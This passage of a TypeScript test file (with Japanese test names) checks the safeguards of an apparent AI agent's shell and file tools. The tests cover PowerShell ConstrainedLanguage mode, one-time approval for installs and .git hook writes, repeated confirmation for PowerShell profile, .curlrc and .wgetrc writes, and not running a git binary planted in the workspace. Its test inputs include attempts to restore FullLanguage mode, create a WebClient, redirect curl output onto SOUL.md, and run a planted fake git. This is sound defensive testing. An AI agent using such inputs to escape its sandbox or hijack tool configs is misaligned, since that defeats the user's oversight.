    cwd: dir, env: scrubEnv(), timeoutMs: 10_000, signal: new AbortController().signal, maxBytes: 1000, fullOutputDir: join(dir, 'out'), outputId: 'test',
  });
  assert.equal(result.truncated, true);
  assert.equal(result.stdout.length, 1000);
  assert.equal(result.totalBytes, 5000);
  await new Promise(r => setTimeout(r, 50));
  assert.equal(readFileSync(result.fullOutputPath!, 'utf8').length, 5000);
});

// ── PowerShell の制限モード（security-self-api.md の L1・V3）────────────────

test('PowerShell の引数: 文字コードの設定のあと、コマンドの前に制限モードにする。bash には付けない', () => {
  for (const choice of ['powershell', 'pwsh'] as const) {
    const args = resolveShell(choice).args('Get-Date');
    assert.deepEqual(args.slice(0, 3), ['-NoProfile', '-NonInteractive', '-Command']);
    const script = args[3]!;
    const utf8 = script.indexOf('[Console]::OutputEncoding');
    const mode = script.indexOf("$ExecutionContext.SessionState.LanguageMode='ConstrainedLanguage';");
    assert.ok(utf8 >= 0 && mode > utf8, `${choice}: 文字コードのあとに制限モード`);
    assert.ok(script.endsWith(';Get-Date') && script.indexOf('Get-Date') > mode, `${choice}: コマンドは制限モードのあと`);
  }
  assert.deepEqual(resolveShell('bash').args('ls'), ['--noprofile', '--norc', '-c', "IFS= read -r -d '' s; [ -n \"$s\" ] || exit 127; eval \"$s\""]);
  assert.equal(resolveShell('bash').stdin?.('ls'), 'ls', 'スクリプトは標準入力で渡す（引数の読み直しで変わらない）');
  assert.deepEqual(resolveShell('sh').args('ls'), ['-c', 's=; n=$(printf "\\nx"); n=${n%x}; while IFS= read -r l || [ -n "$l" ]; do s="$s$l$n"; l=; done; [ -n "$s" ] || exit 127; eval "$s"']);
});

const autoShell = resolveShell('auto');
const powershellAuto = process.platform === 'win32' && /^(?:powershell|pwsh)$/u.test(autoShell.name);

test('PowerShell の制限モード（実機）: .NET の直接呼び出しは止まり、戻せず、ふつうのコマンドと日本語の出力は動く', { skip: !powershellAuto && 'Windows の PowerShell ではない' }, async t => {
  const dir = tempDir(t);
  const run = (command: string) => runProcess(autoShell.file, autoShell.args(command), { cwd: dir, env: scrubEnv(), timeoutMs: 30_000, signal: new AbortController().signal, maxBytes: 20_000 });

  const write = await run("try { [IO.File]::WriteAllText('x.txt','1') } catch { $_.FullyQualifiedErrorId }");
  assert.match(write.stdout, /MethodInvocationNotSupportedInConstrainedLanguage/u);
  assert.equal(existsSync(join(dir, 'x.txt')), false, '.NET でファイルを書けてしまう');

  const back = await run("$ExecutionContext.SessionState.LanguageMode='FullLanguage'; $ExecutionContext.SessionState.LanguageMode");
  assert.equal(back.stdout.trim(), 'ConstrainedLanguage', '元のモードへ戻せてしまう');

  const created = await run("try { New-Object Net.WebClient } catch { $_.FullyQualifiedErrorId }; try { Add-Type -TypeDefinition 'public class A{}' } catch { $_.FullyQualifiedErrorId }");
  assert.match(created.stdout, /CannotCreateTypeConstrainedLanguage/u, 'New-Object が止まらない');
  assert.match(created.stdout, /CannotDefineNewType/u, 'Add-Type が止まらない');

  writeFileSync(join(dir, 'メモ.txt'), 'hello');
  const normal = await run("Get-ChildItem | Select-Object -ExpandProperty Name; 'こんにちは'.Replace('こ','ご'); [DateTime]::Now.Year -gt 2000; (Get-Content メモ.txt).ToUpper()");
  assert.equal(normal.exitCode, 0);
  assert.deepEqual(normal.stdout.trim().split(/\r?\n/u), ['メモ.txt', 'ごんにちは', 'True', 'HELLO']);
});

test('11.7: 入れるもの・.git への書き込みは、事前判定が「今回だけ（コードの確かめ）」を返す。会話の許可では越えられない', async t => {
  const s = setup(t);
  for (const command of ['pip install requests', 'pip install -e .', 'npm install', 'npm install ./pkg', 'npm ci', 'pnpm add x', 'cargo install x', 'Set-Content .git/hooks/pre-commit x']) {
    const pre = await shellRun.preCheck!({ command }, s.ctx);
    assert.equal(pre.decision, 'ask', command);
    assert.equal(pre.onceOnly, true, command);
    assert.deepEqual(pre.askKinds, ['code'], command);
  }
  const first = s.call('shell_run', { command: 'npm install' });
  const request = await decideNext(s, 'deny');
  assert.equal(request.onceOnly, true);
  assert.match(request.reasons.join(), /見せたファイルのほかに/u, '限界の文が札に付く');
  await first;
});

test('ツールの設定ファイル（PowerShell のプロファイルなど）への file_write は、会話の許可を越えて毎回確かめる', async t => {
  const s = setup(t);
  const path = 'dot/Microsoft.PowerShell_profile.ps1';
  const first = s.call('file_write', { path, content: 'Write-Host hi' });
  const request = await decideNext(s, 'conversation');
  assert.equal(request.onceOnly, true);
  assert.match(request.reasons.join(), /ツールの設定ファイル/u);
  assert.match((await first).output.content, /Write-Host hi|書き込みました|書きました|bytes|文字/u);
  const second = s.call('file_write', { path, content: 'Write-Host again' });
  const asked = await decideNext(s, 'deny');
  assert.equal(asked.onceOnly, true, '会話の許可があっても、また確かめる');
  assert.match((await second).output.content, /拒否しました/u);
  assert.equal((await s.call('file_write', { path: 'dot/notes.md', content: 'x' })).decision, 'allow');
});

test('作業フォルダの .curlrc・_curlrc・.wgetrc への file_write も、会話の許可を越えて毎回確かめる。名前が似ているだけのファイルは、これまでどおり', async t => {
  const s = setup(t);
  for (const path of ['.curlrc', 'proj/_curlrc', 'a/b/.wgetrc']) {
    const first = s.call('file_write', { path, content: 'output = "SOUL.md"' });
    const request = await decideNext(s, 'conversation');
    assert.equal(request.onceOnly, true, path);
    assert.match(request.reasons.join(), /ツールの設定ファイル/u, path);
    await first;
    const second = s.call('file_write', { path, content: 'x' });
    assert.equal((await decideNext(s, 'deny')).onceOnly, true, `${path}: 会話の許可があっても、また確かめる`);
    await second;
  }
  for (const path of ['.curlrc.example', 'proj/curlrc', 'notes/.wgetrc.bak']) assert.equal((await s.call('file_write', { path, content: 'x' })).decision, 'allow', path);
});

// 洗い出せない git（2.32 より古い、または版を確かめられない）では、git は何であれ今回だけにする。作業フォルダの中の git は、版を調べるためにも動かさない
async function withGitFirstOnPath<T>(dir: string, body: () => Promise<T>): Promise<T> {
  const key = Object.keys(process.env).find(k => k.toUpperCase() === 'PATH') ?? 'PATH';
  const saved = process.env[key];
  process.env[key] = `${dir}${delimiter}${saved ?? ''}`;
  try { return await body(); } finally { if (saved === undefined) delete process.env[key]; else process.env[key] = saved; }
}

test('git が古い（2.32 より前）と、洗い出せないので git status も今回だけ。新しい git なら許す', async t => {
  const s = setup(t);
  const windows = process.platform === 'win32';
  const fake = join(tempDir(t), 'bin');
  mkdirSync(fake, { recursive: true });
  writeFileSync(join(fake, windows ? 'git.cmd' : 'git'), windows ? '@echo off\r\necho git version 2.20.0\r\n' : '#!/bin/sh\necho git version 2.20.0\n', { mode: 0o755 });
  const old = await withGitFirstOnPath(fake, async () => shellRun.preCheck!({ command: 'git status' }, s.ctx));
  assert.equal(old.decision, 'ask');
  assert.equal(old.onceOnly, true);
  assert.match(old.reasons.join(), /2\.32/u);
  const real = spawnSync('git', ['--version'], { encoding: 'utf8' });
  if (real.status === 0 && /git version (?:2\.(?:3[2-9]|[4-9]\d)|[3-9])/u.test(real.stdout)) assert.equal((await shellRun.preCheck!({ command: 'git status' }, s.ctx)).decision, 'allow');
});

test('作業フォルダの中の git は、洗い出せるかを調べるためにも動かさない', { skip: process.platform === 'win32' && '.cmd は起動できず、動いたかを見分けられない' }, async t => {
  const s = setup(t);
  const bin = join(s.paths.workspace, 'bin');
  mkdirSync(bin, { recursive: true });
  const marker = join(s.paths.workspace, 'ran');
  writeFileSync(join(bin, 'git'), `#!/bin/sh\ntouch "${marker}"\necho git version 2.54.0\n`, { mode: 0o755 });
  const pre = await withGitFirstOnPath(bin, async () => shellRun.preCheck!({ command: 'git status' }, s.ctx));
  assert.equal(pre.decision, 'ask');
  assert.equal(existsSync(marker), false, '作業フォルダの git が動いた');
});
